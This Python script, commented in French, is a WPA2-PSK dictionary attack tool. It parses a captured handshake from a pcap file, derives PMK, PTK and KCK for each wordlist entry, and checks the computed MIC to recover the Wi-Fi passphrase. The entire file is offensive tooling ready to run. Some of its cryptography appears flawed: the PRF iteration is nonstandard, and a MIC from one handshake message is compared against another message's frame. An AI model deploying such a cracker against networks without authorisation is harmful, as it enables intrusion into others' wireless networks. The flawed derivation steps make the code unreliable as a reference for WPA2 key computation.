from scapy.all import *
from hashlib import pbkdf2_hmac
from passlib.utils import pbkdf2
import hmac
import hashlib
import argparse

class Wpa2PskAttack:
    
    def extract_mic_and_nonce_and_ssid(self, input_file):
        packets = rdpcap(input_file)
        
        snonce = None
        mic = None
        sta_mac = None
        bssid = None
        anonce = None
        ssid = None
        eapol_packet = None
        
        for packet in packets:
            if packet.haslayer(EAPOL):
                eapol_layer = packet.getlayer(EAPOL)
                # Check if it's a Key (Message 2 of 4)
                if eapol_layer.type == 3 and eapol_layer.key_mic and not mic:
                    mic = eapol_layer.key_mic
                    print(f"Extracted MIC: {mic.hex()}")
                    if not snonce:
                        snonce = eapol_layer.key_nonce
                        print(f"Extracted SNonce: {snonce.hex()}")
                
                # Check if it's a Key (Message 3 of 4) to extract ANonce
                if eapol_layer.type == 3 and eapol_layer.key_ack and not anonce:
                    anonce = eapol_layer.key_nonce
                    print(f"Extracted ANonce: {anonce.hex()}")
                    eapol_packet = packet  # Save the EAPOL packet for later use
                
                # Extract STA MAC and BSSID
                if not sta_mac or not bssid:
                    sta_mac = packet.addr2
                    bssid = packet.addr1
                    print(f"Extracted STA MAC: {sta_mac}")
                    print(f"Extracted BSSID: {bssid}")
                
                # Break the loop if all values are found
                if mic and snonce and sta_mac and bssid and anonce:
                    break
            
            # Extract SSID from Beacon packets
            if packet.haslayer(Dot11Beacon) and not ssid:
                ssid = packet.info.decode()
                print(f"Extracted SSID: {ssid}")
        
        if not snonce:
            print("No SNonce found in Message 2 of 4.")
        if not mic:
            print("No MIC found.")
        if not sta_mac:
            print("No STA MAC found.")
        if not bssid:
            print("No BSSID found.")
        if not anonce:
            print("No ANonce found in Message 3 of 4.")
        if not ssid:
            print("No SSID found.")
        
        return ssid, bytes.fromhex(sta_mac.replace(":", "")), bytes.fromhex(bssid.replace(":", "")), anonce, snonce, mic, eapol_packet
    
    def main(self, input_file, wordlist):
        ssid, client, ap, anonce, snonce, mic, eapol_packet = self.extract_mic_and_nonce_and_ssid(input_file)
        
        if not (ssid and client and ap and anonce and snonce and mic and eapol_packet):
            print("Error: Missing required information for the attack.")
            return
        
        # Concaténation de plusieurs éléments pour former CONCATENED_NONCE, qui sera utilisé dans le calcul de la PTK
        CONCATENED_NONCE = min(ap, client) + max(ap, client) + min(anonce, snonce) + max(anonce, snonce)
        
        # PAIRWISE_KEY_EXPANSION est une chaîne de caractères constante qui sera utilisée dans le calcul de la PTK
        PAIRWISE_KEY_EXPANSION = b"Pairwise key expansion"
        
        # Lecture du fichier de wordlist et tentative de chaque mot de passe
        with open(wordlist, 'r') as file:
            for passphrase in file:
                passphrase = passphrase.strip()
                
                # Génération de PMK et PSK à partir du mot de passe et du SSID
                PMK = pbkdf2.pbkdf2(passphrase.encode(), ssid.encode(), 4096, 32)
                PSK = pbkdf2_hmac('sha1', passphrase.encode(), ssid.encode(), 4096, 32)
                
                # Affichage de PMK et PSK pour vérification
                print("=========================")
                print(f"Trying passphrase: {passphrase}")
                print(f"PMK: {PMK.hex()}")
                print(f"PSK: {PSK.hex()}")
                print("=========================")
                
                # Calcul de la PTK à partir de PMK, PAIRWISE_KEY_EXPANSION et CONCATENED_NONCE
                PTK = self.PRF(PMK, PAIRWISE_KEY_EXPANSION, CONCATENED_NONCE, 384)
                print(f"PTK: {PTK.hex()}")
                
                # KCK est le premier bloc de 16 octets de PTK, il sera utilisé pour calculer CMIC
                KCK = PTK[0:16]
                print("=========================")
                print(f"KCK: {KCK.hex()}")
                
                # Récupération du EAPOL frame dans le troisième paquet et suppression de la valeur de MIC
                eapol_frame = bytes(eapol_packet[EAPOL]).hex()
                print(f"Original EAPOL Frame: {eapol_frame}")  # Debug: Check original EAPOL frame
                eapol_frame = eapol_frame[:162] + (32 * "0") + eapol_frame[194:]
                print(f"Modified EAPOL Frame (MIC Zeroed): {eapol_frame}")  # Debug: Check modified EAPOL frame
                print("=========================")
                
                # Calcul de la valeur de MIC utilisant KCK et les données extraites des paquets
                CALCULATED_MIC = hmac.new(KCK, bytes.fromhex(eapol_frame), hashlib.sha1).hexdigest()[:32]
                print("=========================")
                print(f"CALCULATED_MIC: {CALCULATED_MIC}")
                print("=========================")
                
                # Vérification si la valeur de MIC calculée correspond à celle extraite du paquet
                if CALCULATED_MIC == mic.hex():
                    print("Le handshake a été capturé avec succès et la valeur de MIC est valide.")
                    print(f"Passphrase trouvée: {passphrase}")
                    break
                else:
                    print("La valeur de MIC extraite du paquet ne correspond pas à celle calculée.")
    
    def PRF(self, pmk, text, key_data, length):
        """
        Cette fonction implémente l'algorithme Pseudo-Random Function (PRF) utilisé pour générer la clé PTK
        """
        # Calcul du hachage HMAC-SHA1 de cette chaîne de caractères avec pmk comme clé
        hmacsha1 = hmac.new(pmk, text + b'\x00' + key_data + b'\x00', hashlib.sha1)
        # Concaténation des octets de hachage pour former le résultat
        result = hmacsha1.digest()
        while len(result) < length:
            hmacsha1 = hmac.new(pmk, hmacsha1.digest(), hashlib.sha1)
            result += hmacsha1.digest()
        return result[:length]

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WPA2 PSK Wordlist Attack")
    parser.add_argument("input_file", help="Path to the pcap file containing the handshake")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to the wordlist file")
    args = parser.parse_args()
    
    attack = Wpa2PskAttack()
    attack.main(args.input_file, args.wordlist)
